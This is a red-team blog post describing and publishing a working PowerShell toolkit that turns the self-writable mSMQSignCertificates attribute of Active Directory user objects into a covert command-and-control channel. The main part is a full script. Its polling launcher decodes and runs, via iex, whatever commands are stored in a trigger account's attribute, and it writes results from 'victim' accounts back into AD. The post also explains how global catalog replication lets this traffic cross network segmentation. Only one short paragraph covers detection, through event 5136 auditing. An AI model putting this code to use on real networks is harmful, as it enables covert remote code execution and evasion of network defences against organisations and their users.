· <time datetime="2016-08-15">2016-08-15</time> · <a href="/en/harmj0y/Powershell/">Powershell</a> · <a href="/en/harmj0y/Red-Teaming/">Red Teaming</a></p><div class="blog-article-body"><p>&#8216;Exotic&#8217; command and control (C2) channels always interest me. As defenses start to get more sophisticated, standard channels that have been stealthy before (like DNS) may start to lose their efficacy. I&#8217;m always on the lookout for non-obvious, one-way (or ideally two-way) communication methods. This post will cover a proof of concept for an internal C2 approach that uses standard Active Directory object properties in a default domain setup.</p>
+<h2 id="section-1">Active Directory Property Sets</h2>
+<p>This dawned on me when reviewing access control list entry information during <a href="https://www.blackhat.com/us-16/training/advanced-powershell-for-offensive-operations.html">training prep</a>. In a default domain setup, there is a set of ACLs for user objects that apply to the user itself, defined by the &#8216;NT AUTHORITY\SELF&#8217; IdentityReference. If you want to check these out for a sample domain, you can run the following <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">PowerView</a> command:</p>
+<pre class="wrap:true lang:ps decode:true">PS C:\Users\harmj0y\Desktop&gt; Get-NetUser USER | Get-ObjectAcl -ResolveGUIDs |
+Where-Object {$_.IdentityReference -eq 'NT AUTHORITY\SELF'}</pre>
+<p>Here&#8217;s an interesting entry:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3028" src="/en/harmj0y/assets/7345d15591e9-personal_information_acl.png" alt="personal_information_acl" width="1394" height="445" /></p>
+<p>So all users are able to write read and write to their own &#8220;Personal-Information&#8221; in Active Directory. This is what&#8217;s known as a <a href="https://www.microsoft.com/en-US/download/details.aspx?id=53314">property set</a> in AD, which were created to group specific common properties in order to reduce storage requirements on the Active Directory database. Unfortunately the material on that link has been archived, but if you download the document, page 8213 has more information on property sets in general, and <a href="https://msdn.microsoft.com/en-us/library/ms684394%28v=vs.85%29.aspx">this MSDN page</a> breaks out the members of the &#8220;Personal-Information&#8221; property set.</p>
+<p><span>Now let&#8217;s see which properties can hold the most data by examining the schema for the ‘user’ object in this domain:</span></p>
+<pre class="wrap:true lang:ps decode:true ">[DirectoryServices.ActiveDirectory.ActiveDirectorySchema]::GetCurrentSchema().FindClass('user').optionalproperties | select name,rangeupper | ?{$_.RangeUpper} | Sort-Object -Descending -Property rangeupper | Select -First 10</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3029" src="/en/harmj0y/assets/b555c1c18d43-user_property_sizes.png" alt="user_property_sizes" width="1398" height="648" /></p>
+<p>The above query will list ALL properties for a generic &#8216;user&#8217; object given the current domain schema, but not all of these properties are self-writable for a user. We want to choose the property with the largest storage limit that is also in &#8216;Personal Information&#8217; property set, which will give us the most flexibility with our communication channel. The <strong>mSMQSignCertificates</strong> field is interesting, as it has a 1MB upper size limit and meets all of our qualifications.<b> </b>Since every user can edit the <strong>mSMQSignCertificates</strong> property for their own user object, we have a nice 1MB two-way data channel (<strong>mSMQSignCertificatesMi</strong><strong>g</strong> is also interesting but not a member of &#8216;Personal Information&#8217;, so it&#8217;s not quite what we need at this point).</p>
+<p>Now what&#8217;s the best way to take advantage of this?</p>
+<h2 id="section-2">Weaponization</h2>
+<p>The use of <strong>mSMQSignCertificates </strong>gives us a one-to-many broadcast approach. One user changes their property field while other users continually query for that world-readable information, and then report results back through their own <strong>mSMQSignCertificates</strong> field. <span>This two-way 1MB channel is stored and propagated by Active Directory itself, which lends a few advantages. We never have to send packets directly to targets, and with some tweaking this should get around some network segmentation setups (see the </span><b>Bending Traffic Around Network Boundaries</b><span> section below for caveats and more details).</span></p>
+<p>The proof of concept code below is <a href="https://gist.github.com/HarmJ0y/a219057e9d2faedf69d32e04c0f1874f">hosted on this gist</a>:</p>
+<pre class="height-set:true lang:ps decode:true " data-url="https://gist.githubusercontent.com/HarmJ0y/a219057e9d2faedf69d32e04c0f1874f/raw/5321a598618d1972e7ef6839149bed5093f8149f/ADC2.ps1">#Requires -Version 2
+
+function New-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Stores PowerShell logic in the mSMQSignCertificates of the specified -TriggerAccount and generates
+        a one-line launcher.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Takes a script block or PowerShell .ps1 file, compresses the data using IO.Compression.DeflateStream,
+        and stores the resulting bytes as a base64-encoded string in the mSMQSignCertificates field of the
+        specified -TriggerAccount, defaulting to the current user. Also generates a one-line launcher that checks
+        for data in mSMQSignCertificates of the specified user on a timed interval, executing logic if it exists
+        and storing the results in mSMQSignCertificates for the current user.
+
+    .PARAMETER ScriptBlock
+
+        Script block to store in the mSMQSignCertificates field for the specified user.
+
+    .PARAMETER Path
+
+        Path of a PowerShell .ps1 script to store in the mSMQSignCertificates field for the specified user.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .PARAMETER SleepSeconds
+
+        The number of seconds to sleep between checks for the mSMQSignCertificates property, default
+        of 60 seconds.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -Path C:\Temp\malicious.ps1
+
+        Store a malicious PowerShell script into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -ScriptBlock {gci C:\} -Verbose
+
+        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; {gci C:\} | New-ADPayload
+
+        Store the specified scriptblock into the mSMQSignCertificates property for the current user and output
+        the launcher code in a custom object.
+
+    .EXAMPLE
+
+        PS C:\&gt; New-ADPayload -ScriptBlock {gci C:\Users\} -TriggerAccount mnelson -SleepSeconds 300 -Verbose
+
+        Store the specified scriptblock into the mSMQSignCertificates property for 'mnelson' user and output
+        the launcher code (utilizing a 5 minute sleep internval instead of 60 seconds) in a custom object.
+#&gt;
+    [CmdletBinding(DefaultParameterSetName = 'ScriptBlock')]
+    Param (
+        [Parameter(ParameterSetName = 'ScriptBlock', Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [ScriptBlock]
+        $ScriptBlock,
+
+        [Parameter(ParameterSetName = 'FilePath', Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
+        [ValidateScript({Test-Path -Path $_ })]
+        [Alias('FilePath', 'FullName')]
+        [String]
+        $Path,
+
+        [Parameter(Position = 1)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName,
+
+        [Parameter(Position = 2)]
+        [ValidateNotNullOrEmpty()]
+        [Int]
+        $SleepSeconds = 60
+    )
+
+    PROCESS {
+        # get the raw bytes for the logic to store
+        if($PSBoundParameters['Path']) {
+            try {
+                $Null = Get-ChildItem -Path $Path -ErrorAction Stop
+                $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path -Path $Path))
+            }
+            catch {
+                throw "Error reading byte from file: $Path"
+            }
+        }
+        else {
+            $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
+        }
+
+        # compress the data using DeflateStream
+        $CompressedStream = New-Object IO.MemoryStream
+        $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+        $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+        $DeflateStream.Dispose()
+        $CompressedScriptBytes = $CompressedStream.ToArray()
+        $CompressedStream.Dispose()
+        $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+
+        $Searcher = [adsisearcher]''
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        # grab the user object we're storing the trigger payload in
+        if($User) {
+            try {
+                $UserEntry = $User.GetDirectoryEntry()
+                $UserDN = $User.Properties.distinguishedname[0]
+                $Null = $UserEntry.Put('mSMQSignCertificates', $EncodedCompressedScript)
+                $Null = $UserEntry.SetInfo()
+                Write-Verbose "Payload stored in 'mSMQSignCertificates' parameter for $UserDN"
+
+                &lt;#
+                The expanded trigger logic:
+
+                    sal a New-Object;
+                    $DC=([ADSI]'LDAP://RootDSE').dnshostname;
+                    $OC=''; # original command
+                    while($True) {
+                        Start-Sleep $SleepSeconds;
+                        $S=[adsisearcher][adsi]"GC://$DC";
+                        $S.Filter="(&amp;(distinguishedname=$UserDN)(mSMQSignCertificates=*))";
+                        $S.CacheResults=$False;
+                        $U=$S.FindOne();
+
+                        if(!$u){continue};
+
+                        $C=[System.Text.Encoding]::ASCII.GetString($u.properties.msmqsigncertificates[0]);
+
+                        # if there's a new tasking command
+                        if($C -and ($C -ne '') -and ($C -ne $OC)){
+                            $OC=$C;
+                            # base64-decode/decompress the command and trigger it
+                            $SB=([Text.Encoding]::ASCII).GetBytes($(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));
+                            $CS=a IO.MemoryStream;
+                            # compress/base64-encde the results
+                            $DS=a IO.Compression.DeflateStream($CS,[IO.Compression.CompressionMode]::Compress);
+                            $DS.Write($SB,0,$SB.Length);$DS.Dispose();$CS.Dispose();$R2 = [Convert]::ToBase64String($CS.ToArray());
+                            # current user
+                            $CU=([adsisearcher]"(samaccountname=$([Environment]::UserName))").FindOne().GetDirectoryEntry();
+                            # put the results in the current user's 'mSMQSignCertificates' field
+                            $CU.Put('mSMQSignCertificates',$R2);$CU.SetInfo();
+                        }
+                    }
+                #&gt;
+
+                $TriggerScript = "sal a New-Object;`$DC=([ADSI]'LDAP://RootDSE').dnshostname;`$OC='';while(`$True) {Start-Sleep $SleepSeconds;`$S=[adsisearcher][adsi]`"GC://`$DC`";`$S.Filter=`"(&amp;(distinguishedname=$UserDN)(mSMQSignCertificates=*))`";`$S.CacheResults=`$False;`$U=`$S.FindOne();if(!`$u){continue};`$C=[System.Text.Encoding]::ASCII.GetString(`$u.properties.msmqsigncertificates[0]);if(`$C -and (`$C -ne '') -and (`$C -ne `$OC)){`$OC=`$C;`$SB=([Text.Encoding]::ASCII).GetBytes(`$(iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`$C),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-String));`$CS=a IO.MemoryStream;`$DS=a IO.Compression.DeflateStream(`$CS,[IO.Compression.CompressionMode]::Compress);`$DS.Write(`$SB,0,`$SB.Length);`$DS.Dispose();`$CS.Dispose();`$R2 = [Convert]::ToBase64String(`$CS.ToArray());`$CU=([adsisearcher]`"(samaccountname=`$([Environment]::UserName))`").FindOne().GetDirectoryEntry();`$CU.Put('mSMQSignCertificates',`$R2);`$CU.SetInfo();}}"
+
+                New-Object -TypeName PSObject -Property @{
+                    TriggerAccount = $UserDN
+                    EncodedPayload = $EncodedCompressedScript
+                    TriggerScript = $TriggerScript
+                    SleepSeconds = $SleepSeconds
+                }
+            }
+            catch {
+                Write-Error "Error setting mSMQSignCertificates for samaccountname: '$TriggerAccount' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Get-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Retrieves the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount,
+        base64-decodes and decompresses the logic, outputting everything as a custom PS object. For users in
+        a foreign domain, use "user@domain.com" syntax.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the compressed logic in, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayload
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayload -TriggerAccount mnelson
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=mnelson,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+
+    .EXAMPLE
+
+        PS C:\&gt; 'CN=harmj0y,CN=Users,DC=testlab,DC=local' | Get-ADPayload
+
+        TriggerAccount                Payload                       EncodedPayload
+        --------------                -------                       --------------
+        CN=harmj0y,CN=Users,DC=tes... dir C:\                       7b0HYBxJliUmL23Ke39K9UrX4H...
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        if($PSBoundParameters['TriggerAccount']) {
+            # get this machine's logon domain controller
+            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
+            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
+            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
+        }
+        else {
+            # if using the current user, just search the current domain
+            $Searcher = [adsisearcher]''
+        }
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        if($User) {
+            try {
+                if($User.properties.msmqsigncertificates) {
+                    $RawCommand = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
+
+                    $Payload = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($RawCommand),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+
+                    New-Object -TypeName PSObject -Property @{
+                        TriggerAccount = $User.properties.distinguishedname[0]
+                        EncodedPayload = $RawCommand
+                        Payload = $Payload
+                    }
+                }
+                else {
+                    Write-Verbose "No payload stored for $TriggerAccount"
+                }
+            }
+            catch {
+                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$TriggerAccount' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Remove-ADPayload {
+&lt;#
+    .SYNOPSIS
+
+        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Removes the script payload stored in the mSMQSignCertificates of the specified -TriggerAccount.
+
+    .PARAMETER TriggerAccount
+
+        The user account to store the remove the trigger from, defaults to the current user ([Environment]::UserName).
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Remove-ADPayload
+
+        Removes the payload stored for the current user.
+
+    .EXAMPLE
+
+        PS C:\&gt; Remove-ADPayload -TriggerAccount mnelson
+
+        Removes the payload stored for the 'mnelson' user.
+
+    .EXAMPLE
+
+        PS C:\&gt; $Payload = Get-ADPayload
+        PS C:\&gt; $Payload | Remove-ADPayload
+
+        Retrieve the AD payload for the current user and then remove it.
+
+    .EXAMPLE
+
+        PS C:\&gt; $Payload = {gci C:\} | New-ADPayload
+        PS C:\&gt; $Payload | Remove-ADPayload
+
+        Create a new AD payload and then remove it.
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Alias('cn', 'username')]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        $Searcher = [adsisearcher]''
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(distinguishedname=$TriggerAccount)"
+        }
+        else {
+            $Searcher.Filter = "(samaccountname=$TriggerAccount)"
+        }
+        $Searcher.CacheResults = $False
+        $User = $Searcher.FindOne()
+
+        if($User) {
+            try {
+                $UserEntry = $User.GetDirectoryEntry()
+
+                # weird way to clear the entry
+                $UserEntry.PutEx(1, 'mSMQSignCertificates', 0)
+
+                $UserEntry.SetInfo()
+
+                Write-Verbose "Removed mSMQSignCertificates property for '$($User.properties.distinguishedname[0])"
+            }
+            catch {
+                Write-Error "Error retrieving mSMQSignCertificates for samaccountname '$($User.properties.distinguishedname[0])' : $_"
+            }
+        }
+        else {
+            Write-Error "Error finding samaccountname '$TriggerAccount' : $_"
+        }
+    }
+}
+
+
+function Get-ADPayloadResult {
+&lt;#
+    .SYNOPSIS
+
+        Retrieves the results of any clients who executed the broadcast logic from New-ADPayload.
+
+        Author: @harmj0y
+        License: BSD 3-Clause
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Queries all users EXCEPT the -TriggerAccount used to broadcast the script logic (default of [Environment]::UserName),
+        extracts out the compressed logic and displays the per-user results. If a -TriggerAccount value is specified,
+        the global catalog is searched for all results (instead of just the current domain)/
+
+    .PARAMETER TriggerAccount
+
+        The user account used to store the broadcast trigger, defaults to the current user.
+        Also accepts distinguishedname syntax (e.g. 'CN=harmj0y,CN=Users,DC=testlab,DC=local').
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayloadResult | fl
+
+        TriggerAccount : harmj0y
+        Results        :
+
+                            Directory: C:\
+
+
+                        Mode                LastWriteTime     Length Name
+
+                        ----                -------------     ------ ----
+
+                        d----         7/13/2009   8:20 PM            PerfLogs
+
+                        d-r--          8/9/2016  11:07 AM            Program Files
+
+                        d-r--         7/13/2009  10:08 PM            Program Files (x86)
+
+                        d-r--         8/12/2016  11:49 AM            Users
+
+                        d----          8/9/2016  11:48 AM            Windows
+
+        VictimAccount  : CN=Justin Warner,CN=Users,DC=testlab,DC=local
+
+
+        Gathers results from all users (except the current user) with mSMQSignCertificates set.
+
+    .EXAMPLE
+
+        PS C:\&gt; Get-ADPayloadResult -Verbose -TriggerAccount harmj0y
+        VERBOSE: Using the global catalog at GC://PRIMARY.testlab.local
+
+        TriggerAccount                Results                       VictimAccount
+        --------------                -------                       -------------
+        harmj0y                       ...                           CN=Justin Warner,CN=Users,...
+        harmj0y                       ...                           CN=user1,CN=Users,DC=dev,D...
+
+
+        Gathers results from all users (except 'harmj0y') with mSMQSignCertificates set by searching the
+        global catalog.
+#&gt;
+    [CmdletBinding()]
+    Param (
+        [Parameter(ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TriggerAccount = [Environment]::UserName
+    )
+
+    PROCESS {
+
+        if($PSBoundParameters['TriggerAccount']) {
+            # get this machine's logon domain controller
+            $GlobalCatalog = ([ADSI]'LDAP://RootDSE').dnshostname
+            $Searcher = [adsisearcher][adsi]"GC://$GlobalCatalog"
+            Write-Verbose "Using the global catalog at GC://$($GlobalCatalog)"
+        }
+        else {
+            # if using the current user, just search the current domain
+            $Searcher = [adsisearcher]''
+        }
+
+        if($TriggerAccount.Contains(',')) {
+            $Searcher.Filter = "(&amp;(!distinguishedname=$TriggerAccount)(mSMQSignCertificates=*))"
+        }
+        else {
+            $Searcher.Filter = "(&amp;(!samaccountname=$TriggerAccount)(mSMQSignCertificates=*))"
+        }
+        $Searcher.CacheResults = $False
+
+        ForEach($User in $Searcher.FindAll()) {
+            try {
+                $Raw = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
+                $Results = (New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($([System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0]))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
+
+                New-Object -TypeName PSObject -Property @{
+                    TriggerAccount = $TriggerAccount
+                    VictimAccount = $User.properties.distinguishedname[0]
+                    Results = $Results
+                }
+            }
+            catch {
+                Write-Error "Error retrieving results from 'mSMQSignCertificates': $_"
+            }
+        }
+    }
+}</pre>
+<p>Use <strong><span class="pl-en">New-ADPayload</span></strong><span class="pl-en"> to register a new broadcast trigger for the current (or specified) user and output a one-line launcher in a custom PSObject. This launcher is usable from any user logged on anywhere in the forest (more on this at the end of the post). All code taskings and results are compressed using .NET&#8217;s <a href="https://msdn.microsoft.com/en-us/library/system.io.compression.deflatestream%28v=vs.110%29.aspx?f=255&amp;MSPPError=-2147217396">[IO.Compression.DeflateStream]</a> in order to save on space, and then base64&#8217;ed before being stored in the <strong>mSMQSignCertificates</strong> property of the target user.</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3374" src="/en/harmj0y/assets/060ebbbd2f52-ad_payload_new-1024x618.png" alt="ad_payload_new" width="640" height="386" /></p>
+<p>After the TriggerScript logic is launched on a target host, u<span>se <strong>Get-ADPayloadResult</strong> to query all users EXCEPT the <strong>-TriggerAccount</strong> used to broadcast the script logic (default of [Environment]::UserName), extract out the compressed data, and display the per-user results.</span></p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3375" src="/en/harmj0y/assets/d4901cda6557-ad_payload_result-1024x610.png" alt="ad_payload_result" width="640" height="381" /></p>
+<p><strong>Get-ADPayload</strong> will retrieve any payload stored in <strong>mSMQSignCertificates</strong> for the given -TriggerAccount (defaulting to the current user) and <strong>Remove-ADPayload</strong> will remove the script payload:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3376" src="/en/harmj0y/assets/57231b7c4bc3-ad_payload_removal-1024x220.png" alt="ad_payload_removal" width="640" height="138" /></p>
+<h2 id="section-3">Bending Traffic Around Network Boundaries</h2>
+<p>As I mentioned briefly, one of the coolest side effects of this approach is that you can get around some network segmentation setups, assuming that the broadcast user and victim user are in the same forest. While I&#8217;m not going to go deep into <a href="https://blog.harmj0y.net/tag/domain-trusts/">domain trusts</a>, I&#8217;ll cover a few quick points. Check out <a href="https://twitter.com/pyrotek3">Sean Metcalf</a>&#8216;s 2016 <a href="https://adsecurity.org/?page_id=1352">BlackHat/DEF CON &#8220;Beyond the MCSE*&#8221; presentations</a> for more information.<br />
+<b></b></p>
+<p>An Active Directory global catalog is a, &#8220;<a href="https://technet.microsoft.com/en-us/library/cc730749%28v=ws.11%29.aspx"><em>a domain controller that stores a full copy of all objects in the directory for its host domain and a partial, read-only copy of all objects for all other domains in the forest</em></a>&#8220;. Not all object properties are replicated, but rather only properties in the &#8220;partial attribute set&#8221; defined in the domain schema. We can enumerate all the schema objects by using the &#8220;<strong>(isMemberOfPartialAttributeSet=TRUE)</strong>&#8221; LDAP filter, for example using PowerView:</p>
+<pre class="wrap:true lang:ps decode:true">Get-ADObject -ADSPath "CN=Schema,CN=Configuration,DC=testlab,DC=local" -Filter "(isMemberOfPartialAttributeSet=TRUE)" | Select name</pre>
+<p>And luckily for us, the <strong>mSMQSignCertificates</strong> field is included in the partial attribute set for the default schema! This is also <a href="https://msdn.microsoft.com/en-us/library/ms677900(v=vs.85).aspx#win_8_server">documented by Microsoft here</a>.</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3378" src="/en/harmj0y/assets/3d251530c3e8-partial_attribute_set2-1024x772.png" alt="partial_attribute_set2" width="640" height="483" /></p>
+<p>Any time we modify the <strong>mSMQSignCertificates</strong> field for a user, that data should propagate to all copies of the global catalog in the forest. So even if our trigger or victim users can&#8217;t reach each others&#8217; domains directly due to proper network segmentation, as long as the global catalog is allowed to replicate, we have a basic two-way channel between any two users in a forest (as long as each user can reach their normal domain controller/global catalog).</p>
+<p>We can read our &#8216;broadcast&#8217; traffic through the global catalog, but we can&#8217;t write to attributes using this method; overall we don&#8217;t care since the default behavior is for each user to modify their own <strong>mSMQSignCertificates</strong> in their current domain. We&#8217;re also at the mercy of the replication speed of the global catalog, so while this channel is reasonably sized (1MB), it&#8217;s not going to be practical for interactive communications.</p>
+<p>For the proof of concept code in this post, the <strong>TriggerScript</strong> generated by <strong>New-ADPayload</strong> will automatically query the victim&#8217;s global catalog for the trigger account. <strong>Get-ADPayload</strong> and <strong>Get-ADPayloadResult</strong> by default will query only the current domain, unless a <strong>-TriggerAccount X</strong> argument is passed, in which case the global catalog is searched. The following screenshot shows results from users in two domains in the forest, where the machine each user is currently on is explicitly disallowed from direct communication with the foreign domain controller:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-3379" src="/en/harmj0y/assets/6a5eb8e59045-forest_result-1024x166.png" alt="forest_result" width="640" height="104" /></p>
+<p>As far as defensive mitigations go, <a href="https://twitter.com/carlos_perez">Carlos Perez</a> pointed me to the &#8220;<a href="https://technet.microsoft.com/en-us/library/dd772641%28v=ws.10%29.aspx?f=255&amp;MSPPError=-2147217396">Audit Directory Service Changes</a>&#8221; AD policy. With this auditing policy enabled, changes to an active directory object will produce an event with ID 5136, meaning &#8220;a directory service object was modified&#8221;. This should let you track the modifications of object fields like <strong>mSMQSignCertificates</strong>. There&#8217;s more information on this event ID <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=5136">in this article</a>.</p>
+<p>As a last note, the proof of concept code doesn&#8217;t implement any encryption (though this would be relatively simple), so I wouldn&#8217;t recommend using it in its unmodified state on engagements.</p>
+<p>Have fun :D</p>
+</div><footer class="article-source" id="original-source"><p>Original article by harmj0y</p><a href="https://blog.harmj0y.net/powershell/command-and-control-using-active-directory/" rel="author external">Command and Control Using Active Directory — blog.harmj0y.net ↗</a></footer></article><nav class="page-navigation" aria-label="Previous and next page"><a href="/en/harmj0y/Powershell/kerberoasting-without-mimikatz/" rel="prev"><small>Previous</small>Kerberoasting Without Mimikatz</a><a href="/en/harmj0y/Powershell/powershell-rc4/" rel="next"><small>Next</small>PowerShell RC4</a></nav></main><aside class="page-outline" aria-label="On this page"><p class="eyebrow">On this page</p><nav id="page-toc"><a href="#article-title">Command and Control Using Active Directory</a><a href="#section-1" class="toc-sub">Active Directory Property Sets</a><a href="#section-2" class="toc-sub">Weaponization</a><a href="#section-3" class="toc-sub">Bending Traffic Around Network Boundaries</a></nav><a class="back-top" href="#top">Back to top ↑</a></aside></div>
+<footer class="site-footer"><span>Raw2Crawl · Security documentation</span></footer>
+</body></html>
